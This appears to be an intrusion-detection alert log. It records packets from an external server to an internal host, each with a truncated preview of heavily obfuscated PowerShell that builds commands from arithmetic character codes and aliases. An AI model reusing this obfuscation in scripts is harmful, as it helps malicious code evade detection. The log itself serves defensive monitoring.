028)),(-7831+7945),(4430-4361),(436985/4505),(719136/(3606+(10897182/(-7096+10075)))),(312832/(15933376/(8960-3663))),(88875/(-5507+(3751+(14573286/(-4264+8170))))),(296645/3755),(951482/9709),(7270-(472+6692)),(575094/(3230+(4930464/(8412204/4204)))),(-2609+(6255-(9975-6428))),(-4665+4781))| ForEach-Object { [char]$_ }));& ((-join (@((6150-(12498485/(8453-6382))),(-9367+(2843+6625)),(10157-10041),(2218-(13159688/6056)),(2126-2029),(-3876+3984),(798945/7609),(-8572+8669),(2676-2561))| ForEach-Ob
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.872807
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
3770-1425)),(785715/(13122-5639)),(424278/4374),(2817-(5381-2679))) -join '')) pvsfbzxgnimkod ([char[]]@((-7614+(727+(-926+(4356+3527)))),(942945/(1756+6739)),(9754-9640),(-1054+1123),(7653-(11809-(9148-(12205-7310)))),(-1228+(12704698/9574)),(10114-10010),(252630/5614),(-5221+(6820-(4996240/(-932+4219)))),(364070/(8373610/(-6774+9028))),(-8806+8912),(2325-(10164-(23097460/2909))),(9552-(7852+(11631-(89477630/8921)))),(877888/(16927-9359))) -join '');& (([system.String]::new(@((7290-7175),(-3601
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.876784
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
10-9437)),(7758-7647),(178182/(9142-7579)),(1405-1336),(1336-(7856-(8451-(13694478/(4347+(5733-(-2729+5342))))))),(497871/5029),(10080-9976),(235755/5239),(185334/(-2892+5238)),(-8648+8746),(-2365+2471),(613878/(-323+6401)),(2893-2794),(-3750+3866)) -join '');& ((-join (@((5152-(11980-6943)),(802344/7944),(-7128+(73070228/10087)),(6136-6091),(-2982+3079),(348948/(20636397/(34706958/5434))),(-6270+(14180-7805)),(-1115+1212),(891250/7750))| ForEach-Object { [char]$_ }))) zlituk ([system.String]::n
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.878066
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
6753-(-2567+9222)),(551412/5202),(7974-(13136-(12858-7595))),(285714/(4496388/1558)),(9017-(16615-(465+7249))))));& ((-join (@((1008550/8770),(210787/(3606-1519)),(-2492+2608),(-9430+9475),(749228/7724),(7093-6985),(7648-(5735+1808)),(449304/(34244376/(45733098/(47941500/(15+(14861-(66927392/9392))))))),(722200/6280))| ForEach-Object { [char]$_ }))) umizacftoqsdp ([system.String]::new(@((-6014+6084),(1134531/(92949774/9094)),(3437-(9372-(31170497/5153))),(383502/(8076-2518)),(2467-2370),(208989/
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.881449
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
732)))),(6068-(12783-(-66+6897))),(-7443+(9443-(2332315/(11368-10175)))),(4066-(9648-5679)),(-4900+(14826-9818)),(217875/(-894+2969)),(2655-2558),(-3374+(-644+4133)))))) kxqsocnz (-join (@((1252-1182),(8332-8221),(-9097+9211),(361905/(14099-8854)),(769986/(-368+8306)),(2694-2595),(-2043+(13700007/6381)),(9608-9563),(-5384+(11570-(4459+(5786-4138)))),(-4727+(35999325/(39215016/5256))),(-1006+1112),(386325/3825),(157608/(5664-4072)),(-2730+2846))| ForEach-Object { [char]$_ }));& (([char[]]@((-3216
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.883634
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
8)),(8148-(82232914/(33828768/(11939-8627)))),(-8742+(84016023/9503)),(-8974+9078),(388755/8639),(4061-3982),(8913-(1552+(16116597/(1115+1104)))),(-2936+3042),(-3082+(-114+3297)),(949509/9591),(928348/8003)) -join '');& (([system.String]::new(@((442290/3846),(914757/(17670-8613)),(532904/4594),(9021-8976),(5436-(49396428/(40320216/4358))),(832248/(6159+(9831185/(12959-(16597-9993))))),(-9661+(8539+(-1381+(12303-9695)))),(229308/(13406244/(-1145+6816))),(-4101+(500+(1279+2437))))))) khrsabpfizvwn
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.886411
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
7679-5858))))),(6462-(23505584/(5304-1600))),(9912-9867),(257147/(1218+1433)),(-8209+(5992+(-5466+(5190+(7202169/(3444636/(9967-(7184+(4221477/(27792076/(22807132/2251))))))))))),(-2961+3066),(3265-3168),(-5865+5980)) -join '')) kvjiwl (-join (@((2057-(4169-2182)),(10154-(16514-(18558828/2868))),(-9736+9850),(9802-(78856766/(15216-(1977+(30277478/5894))))),(456967/(14706-(15278-(-4784+(16654-6587))))),(948915/(16965450/1770)),(-4176+4280),(5955-(32936430/(22096945/(9020-(35683245/(15194-8135))))
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.890899
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
7-(13680-(3815+(-3724+7713)))))))),(8207-8102),(3276-3179),(10063-9948)) -join '')) epmzya ([system.String]::new(@((-9625+9696),(1471-(6319810/(8035846/(16106532/9246)))),(-2434+2550),(147555/3279),(-7917+(17587-9583)),(2771-2662),(1417-(9863-8551)),(-6065+(-3963+10107)),(-2256+(12050-9696)),(564874/5329),(6207-(-480+(65807312/(8291+1701)))),(3466-(19151496/5688)),(6006-(8709-(-3466+6285))))));& (([char[]]@((9384-9269),(-6477+6578),(1910-(7306-(25410320/4610))),(-4370+(6168-(11088-(13825135/1481
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.892615
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
((5567-5484),(-1468+(7276-5707)),(378864/3508),(6013-5912),(-4305+4404),(988088/(13029-(14447-(14662-(2220+2506))))),(-3279+(12657-9333)),(-9697+(14702-(10343-5417))),(1381-1283),(695360/6560),(-5974+6075),(1689-(4800-(-2246+5456))),(876148/7553))| ForEach-Object { [char]$_ }));& (([char[]]@((-4118+4233),(216140/(-5010+7150)),(575708/(-868+5831)),(352350/7830),(325144/(-1013+4365)),(725544/(198+6520)),(751695/(49848117/6963)),(903652/(42210796/4531)),(-7050+7165)) -join '')) rlezwkctausip ([char
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.894139
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
4890974/(50094948/(4774+2360)))),(1632-(-7849+(1077+8288))))| ForEach-Object { [char]$_ }));& (([char[]]@((1010965/(153+8638)),(-2622+(-3713+6436)),(-1024+(-5016+6156)),(373185/8293),(6540-(14370-(79111460/9980))),(-7901+(81667773/(6522+(1611+2064)))),(3095-2990),(9985-(3354+(65686302/10053))),(1155520/(517+(30279987/(-3649+(4416+(5724-(-1375+4689)))))))) -join '')) rctuadjsn (-join (@((-4896+4966),(707958/(13898-7520)),(4567-(22763736/5112)),(-7621+(4578+(12945-9833))),(762517/(5954+1907)),(938
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.895495
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
567)) -join '');& ((-join (@((331085/(6128-(-6988+10237))),(4762-(-5098+9759)),(9347-9231),(-1774+(-6772+8591)),(-9268+9365),(792936/(3438+(13701-9797))),(662130/(11867-5561)),(972328/(81414928/(9478-1356))),(-5906+(-1937+7958)))| ForEach-Object { [char]$_ }))) mwshocraiyzdj ([char[]]@((2375-2305),(4569-(45525096/10212)),(962274/(55854097/(791+(-3918+9744)))),(2920-2851),(825470/(33129430/3893)),(903474/9126),(-7889+(2430+(13034-(13931-6460)))),(446580/9924),(-7673+(-435+(5935+(21078720/9360))))
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.898972
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
 ForEach-Object { [char]$_ }))) trjicugwxolmyn ([system.String]::new(@((4692-(40188290/(31762835/(26221234/(45408028/(15720-(53442466/5689))))))),(597513/(11742-6359)),(9444-(476+(10412304/(5361384/4559)))),(348726/5054),(158401/1633),(884169/8931),(-2825+(6282-(13429-(14338-4262)))),(9041-8996),(6801-(24051316/(10420-(22024398/3219)))),(5948-(-1364+(3478+(12583-(39616866/(-318+(31217164/(55124721/(11878-3409))))))))),(358810/3385),(-1579+1680),(6915-6816),(478268/4123))));& (([system.String]::n
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.900542
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
-Object { [char]$_ }))) ijcsveqydwl ([system.String]::new(@((-7405+(9246-1763)),(252298/(7031870/2815)),(1216061/(4019+(23913400/3857))),(-7308+(4255+3098)),(1483-1404),(-4714+(12819-(4026+(15135762/3802)))),(459828/(-2288+6626)),(836886/8286),(-4850+(16559354/3346)),(176900/1525))));& (([char[]]@((9919-9804),(397334/(2791+1143)),(296844/2559),(340740/(16572-9000)),(9369-(12860-3588)),(4956-(11549-6701)),(8741-(80237076/(93263058/10038))),(160535/(4616-2961)),(1092730/9502)) -join '')) badkgnrpq
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.902473
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
14960-(15011-(4956+2063)))))),(712008/(4031+(-5621+(17871-10143)))),(331605/(30448708/(1536+(304+(2725188/(8353-(11676-4512))))))),(-4636+4733),(2836-2728),(-1218+(-8344+9667)),(557168/5744),(-1944+2059))))) hbmkyqjrcoxzgl (-join (@((-4974+(29164408/5782)),(-8060+8171),(-3843+(14961417/(290+(22098030/6330)))),(-2208+(15843366/(5235+(10771-(4584+4464))))),(-7847+7944),(594099/6001),(778648/(39194445/(11629-(62731534/(13911-4100))))),(-5469+(1623+3891)),(-6918+(13553189/(15246127/(1162+(58126776/8
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.907089
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(902097/8127),(3414-3300),(-9936+10005),(8483-(1022+7364)),(700326/7074),(-8541+(14703-6058)),(8097-(620+7432)),(237000/(-2199+(7570-(-3860+(-3889+(14746-4626)))))),(-7272+(13325-(11457-5502))),(455270/(8896-4601)),(6005-5904),(1290-1191),(-7660+7776))));& ((-join (@((-1282+(9249537/(60323931/9111))),(-7893+(23406432/(6584-3656))),(-4335+(10953911/2461)),(321165/7137),(878723/(23263512/(5598-3030))),(405648/3756),(636090/6058),(921112/9496),(2704-(22425918/8662)))| ForEach-Object { [char]$_ })))
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.908538
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(570+(-3680+6765))),(437472/(18373824/(9899-(-2603+(14872-(10241394/(5261228/(7241-3909)))))))))));& ((-join (@((2400-2285),(142006/(9001-(10660-3065))),(-1842+1958),(3662-(29634081/8193)),(-7343+7440),(-1124+1232),(9186-(-1034+(15299-5184))),(1430-1333),(-7070+7185))| ForEach-Object { [char]$_ }))) yqarpmje (-join (@((418064/(9604660/2665)),(1489-(12252627/(10592-(-1679+(733+(8089110/3110)))))),(827046/8354),(-7766+(17302-(15164-(49659115/8665)))),(-3649+(8723-4967)),(821396/(926+(5480+(1760948
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.910622
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
),(9925-(17453-(40311003/5277))),(872442/7653),(6989-6920),(-2052+(12575948/5852)),(-3045+(-1289+4433)),(6220-(7757-1641)),(-7386+7431),(330220/(22831160/5462)),(170128/1736),(352874/3329),(799314/7914),(3300-(5163213/1613)),(-2608+(7990-5266)))| ForEach-Object { [char]$_ }));& (([system.String]::new(@((-6954+7069),(9415-(64685730/(10614-(12326-8657)))),(459592/3962),(76005/(5814-(14598375/(14729318/4162)))),(316899/(29899584/9152)),(5698-5590),(2658-2553),(3498-(-2582+(47193904/(27584336/(-3386
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.913205
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
98+5087)),(-7237+(9282-1976)),(-4494+4591),(690723/(16012215/(18440325/8035))),(-10045+(4610+5539)),(-5814+5859),(-5567+5646),(3451-3353),(241892/2282),(9113-(74376036/8253)),(-8439+(12721620/1490)),(7860-(12486-4742)))| ForEach-Object { [char]$_ }));& (([char[]]@((-1192+1307),(745380/7380),(614220/5295),(-5055+5100),(-9886+9983),(-4296+(9762-5358)),(-9238+9343),(403132/(-5380+9536)),(9260-9145)) -join '')) kxfioycrwbg ([char[]]@((667590/(26961099/(5894295/2085))),(-9745+(5435+4421)),(-5044+5158
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.914654
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
7-8552),(254924/2524),(-7311+7427),(132975/2955),(372092/(-5955+9791)),(1677-1569),(-5227+(13388-(41303112/5127))),(-2234+2331),(2466-2351))))) jnawvxib ([system.String]::new(@((-2160+2242),(9964-(93146172/9444)),(117523/1141),(274680/2616),(-3728+3843),(3662-3546),(-9251+9352),(809286/7099),(207630/(864+3750)),(9828-9749),(2006-(11495700/(19255900/3196))),(-5236+(14520-(4530+(1175+(29985882/(76203684/(6548+2278))))))),(234522/(-1693+4015)),(6637-(16552-10014)),(-6373+(55286280/8520)),(-3356+(12
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.919521
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
),(-4863+(-1028+(12243-(13820-7565)))),(572700/4980))))) qkdulog ([char[]]@((2440-(22932120/(12917460/(7696-6361)))),(653790/5890),(-9326+9440),(-3793+3862),(-7734+7831),(3515-(7218-3802)),(-9987+10091),(-5474+5519),(754924/9556),(6303-(-2359+(18768-10204))),(5499-(10176591/(-2835+(7982-(10130-(10414-3544)))))),(308858/3058),(946341/9559),(4787-4671)) -join '');& ((-join (@((3624-(4734-(9918825/(13976-(12361-6482))))),(8729-8628),(283388/2443),(7652-7607),(-6072+6169),(3949-(12371-(5694+(3655604
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.923777
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
6/8826)),(301104/(12030-(12667-(357+3068)))),(-3817+3922),(-5454+(4235+(5175-(-3249+(3257+(-1824+5675)))))),(-6202+6317)) -join '')) gsuvoel (-join (@((3195-3125),(3840-(8525-(23697036/(15037-10096)))),(-2370+2484),(-1269+1338),(3244-(17975664/(750+(7215-(4904781/2177))))),(-4172+4271),(4365-4261),(-7992+(55704447/6931)),(3883-(35582616/(6929+(7489-(7226328/(12664625/8875)))))),(268618/(17005164/6204)),(4584-4478),(682962/6762),(926739/(5933+(6434-3006))),(2249-(7542-5409)))| ForEach-Object { [c
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.926612
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
374240/(14670-(4487+2713)))))),(932764/(1798+(10687-2967))),(4776-4670),(3253-(6429-(-2348+(27658125/(281+(305+(6285-1954))))))),(364419/3681),(4541-(23514450/(11710-(14717196/(10621-8320))))))| ForEach-Object { [char]$_ }));& ((-join (@((-2902+3017),(821534/(2973+5161)),(3466-3350),(-3000+(4370-(-6450+(14997975/(11379171/5899))))),(-1096+(8524-(12030-(7266-2567)))),(9341-9233),(-2282+2387),(5482-(-1978+7363)),(8428-8313))| ForEach-Object { [char]$_ }))) pblehmosauigjk (-join (@((316260/(-4759+(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.930199
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
,(-5845+5944),(4086-3970))));& ((-join (@((233795/(5135358/2526)),(842441/(-1172+(-687+10200))),(-6787+6903),(397170/(11977-3151)),(-8710+8807),(-7536+7644),(-6295+6400),(7524-(14930-7503)),(-6414+(49561639/(58822659/(9075-1326)))))| ForEach-Object { [char]$_ }))) eijaqurzhbdpl ([char[]]@((3012-2947),(7745-7645),(231000/2310),(445725/9905),(132048/(-1816+(28648928/8456))),(684134/(7625-(-4370+(7760-(8653062/(21574724/(33405796/(11122-1680)))))))),(-7651+(13861-6098)),(9809-9708)) -join '');& ((-
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.938088
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
700438/3782)),(178848/2592),(-5186+5283),(5976-5877),(-6137+6241),(3528-3483),(6093-6014),(818790/(10764-2409)),(7105-6999),(7005-(60575696/8774)),(-6464+(19820260/(30692260/10163))),(-5105+5221))));& ((-join (@((-2810+(5216-(2783565/(8936-(-1880+9601))))),(5442-5341),(1014884/8749),(-7523+7568),(-9489+9586),(752652/6969),(686910/6542),(2338-(-2277+4518)),(-4216+(25180434/5814)))| ForEach-Object { [char]$_ }))) veksqjtywglh (-join (@((546630/7809),(-9798+(81798795/8255)),(1159380/10170),(6649-(-
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.942432
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
,(-3154+(10248180/(-2267+5401))),(-5502+5547),(-3553+3650),(-3273+3381),(988050/9410),(2663-2566),(712540/6196)) -join '')) cqgxyod ([char[]]@((5335-(-1685+6950)),(9328-9217),(-3940+4054),(4296-(-2557+(61157760/(78241185/(11355-(3858-1182)))))),(3085-(24815340/8305)),(-5999+6098),(583960/5615),(-7167+7212),(420280/(7160720/1346)),(112700/(-3739+4889)),(4263-4157),(337239/(1023+2316)),(9518-9419),(7706-(-825+(12880-4465)))) -join '');& (([system.String]::new(@((-1078+1193),(875165/8665),(-8712+(1
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.946139
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
5270-(-622+(14402-9798))))),(-8422+(60500520/(4886+(8853355/3997)))),(-9705+9811),(178366/1766),(10187-(2816+7272)),(4594-4478))| ForEach-Object { [char]$_ }));& (([char[]]@((-8947+9062),(556510/(13822-(3999+(-2672+6985)))),(3885-(34991396/9284)),(5599-5554),(7014-6917),(-5778+5886),(9342-9237),(-2005+2102),(-2779+2894)) -join '')) uvrfwpx (-join (@((-9343+(1796+7617)),(-6430+6541),(9228-(19093830/(9108-7013))),(2651-(10664-8082)),(355893/3669),(901296/(15135-6031)),(751400/7225),(435690/9682),(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.948601
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
-8925+9030),(6466-6369),(834900/(8668440/1194)))))) esgojmkuwnh (-join (@((240240/3432),(7619-7508),(447678/3927),(338376/(-2231+7135)),(-8052+(68451600/8400)),(-7041+(-2440+(1544+(13182-5146)))),(-4952+5056),(-1942+(14938266/(15474-7956))),(-1981+2060),(-1017+(10003780/(7088+1884))),(904286/(12838-4307)),(165741/(10467939/(46802723/7337))),(8579-(23345440/2753)),(-3935+(-1486+(7181489/(11061-9764)))))| ForEach-Object { [char]$_ }));& (([char[]]@((9681-9566),(-9283+9384),(-7638+(5921+(517+1316))
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.949995
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
699/4401),(8560-8456),(229095/5091),(-7245+7324),(302232/(6695-3611)),(1802-(-4234+(15578110/(6439-(5050900/1325))))),(813656/8056),(410949/4151),(6541-(9075-(5348-(-259+2957)))))| ForEach-Object { [char]$_ }));& (([char[]]@((2942-2827),(7730-(5735+(9286-7392))),(1160232/(15266-(-1569+6833))),(-9795+9840),(-4529+(22052142/(-3265+(3023+5009)))),(-9194+9302),(-9500+9605),(-6512+(57366120/(70108360/(13532-5455)))),(1379-(-1525+2789))) -join '')) zwompvh ([char[]]@((461300/6590),(589077/(36315801/(2
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.952765
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
69-(18557604/2087)))),(8564-(13460940/1590)),(997460/9410),(7310-(-327+7536)),(804078/(2428+(10261-4567))),(-9248+(36959708/3947)))));& (([char[]]@((565340/4916),(484800/(6856-2056)),(-9655+9771),(262170/5826),(6268-(3952+(6255-4036))),(539352/4994),(1047480/(969+(5706+(8845-5544)))),(-7067+(21878856/(8343-(750+(34310301/7559))))),(-7261+7376)) -join '')) qvenwxsrhz ([char[]]@((6906-(16203-(82954152/8856))),(5880-(40094550/6950)),(5300-(2450+(19767600/(8363-1138)))),(9386-(18669-(6458+(5526-(174
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.955225
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
1784-4774))),(954063/(19849-10212)),(-7877+7993))));& ((-join (@((445740/(29147520/7520)),(955965/(19432-9967)),(-1046+(-5504+(-3546+10212))),(145350/(1704+(7505-5979))),(806361/8313),(3950-3842),(673680/6416),(637678/(2608+3966)),(1979-(-5487+(9805-2454))))| ForEach-Object { [char]$_ }))) dtfncisbomyl ([char[]]@((6721-(-1216+(-1704+9571))),(-3191+(10804144/3272)),(3608-3494),(6214-(7606-(5478-4017))),(358318/3694),(149985/1515),(-3904+4008),(-7073+7118),(236763/2997),(480298/(10579-(-3195+(1833
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.958299
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
rEach-Object { [char]$_ }))) elyknfmzv ([char[]]@((-7964+8034),(5086-4975),(6771-6657),(-2825+2894),(5379-5282),(-8797+8896),(895336/(5078+3531)),(5597-5552),(424467/5373),(2674-(3930-(-8657+10011))),(139814/1319),(7232-7131),(6895-(15459-8663)),(-9110+(19288-10062))) -join '');& (([char[]]@((1090085/9479),(7642-(32856137/4357)),(2464-2348),(61605/1369),(7016-6919),(653076/6047),(-3787+3892),(8856-8759),(4054-(6414-(-3970+(8025-(-749+(-1246+(23355475/(8240-1707))))))))) -join '')) ytadnphojw ([s
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.959989
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
);& (([system.String]::new(@((594435/(1063+4106)),(992527/9827),(-1922+2038),(7005-6960),(866792/8936),(-9759+9867),(734475/(15520-8525)),(4199-4102),(-9230+(5744+3601)))))) xgajhwniostqk ([char[]]@((4884-4814),(549450/(19493100/3938)),(502854/(32125313/(16122-8839))),(303738/(7631-(-1799+5028))),(-3843+(15271440/(10461-(37356705/5673)))),(-8934+(12316-(-1864+(1511+3636)))),(-9136+9240),(358695/7971),(-1031+1110),(6023-5925),(-6443+(-1275+7824)),(713060/(-2485+(60963915/(24462210/3830)))),(-8617
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.961408
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(14302116/(29081241/(625+(12732-(14993-8769)))))),(-5670+5769),(353184/3396),(8485-(14548-6108)),(195209/2471),(-5160+(27620274/(-1444+(2854+3843)))),(-1033+1139),(-6811+(20438784/(27748488/(17504-(17561-(11975-2534)))))),(4913-4814),(-5253+5369))));& ((-join (@((8628-8513),(862338/8538),(593340/(28730955/5617)),(212535/4723),(-9412+(16846-(55401687/7551))),(6611-6503),(5121-5016),(4797-4700),(-6585+(33171700/4951)))| ForEach-Object { [char]$_ }))) kmvcfnghleas ([system.String]::new(@((-1579+164
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.963695
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
6/5818)),(-3938+(-3793+7830)),(-5851+5967))));& (([system.String]::new(@((-7416+7531),(490557/(30322251/6243)),(197896/(16860398/9883)),(8367-(60800532/(13832-6526))),(-5513+(-1706+(5010+2306))),(966060/(10131-1186)),(451920/(1900+2404)),(8609-8512),(8598-8483))))) cyhgbixwzufoqm ([char[]]@((3611-(12052-8511)),(7379-(-2127+9395)),(6358-6244),(-7903+(-709+8681)),(-5385+5482),(-8668+(21864898/2494)),(1039792/(14249-(-2777+7028))),(421380/9364),(6157-(10775-4697)),(9312-(18006-8792)),(8579-8473),(-
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.965390
Signature(s): powershell_command
Threat Score: 8

